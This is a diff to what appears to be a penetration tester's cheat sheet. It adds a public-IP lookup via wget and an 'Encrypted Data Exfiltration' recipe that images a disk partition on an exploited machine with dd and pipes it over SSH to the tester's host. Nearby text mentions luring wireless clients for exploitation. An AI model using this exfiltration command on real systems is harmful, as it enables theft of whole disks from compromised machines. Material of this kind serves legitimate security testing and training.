@@ -8,6 +8,10 @@ or
 
 	dig +short myip.opendns.com @resolver1.opendns.com
 
+or
+
+	wget -qO- ifconfig.me/ip
+
 ## Configure a Windows machine as a WPA2-PSK Access Point ## 
 
 ### Usage scenario: Share a Windows machine’s Internet access with other systems wirelessly, or use a Windows machine to attract wireless clients into joining it for exploitation purposes
@@ -45,5 +49,12 @@ running malware.
 
 
 
+## Encrypted Data Exfiltration
 
+### Exfiltrate the contents of an image via SSH to another machine, compressing (-C) the content to speed up transfer. Usage scenario: Upon exploiting a machine with a small file system or particularly interesting partition, move that partition to the pen tester’s machine, compressing and encrypting data using SSH.
+
+	dd if=/dev/rdisk0s1s2
+	bs=65536 conv=noerror,sync
+	| ssh -C user@10.10.10.10
+	"cat >/tmp/image.dd"
 
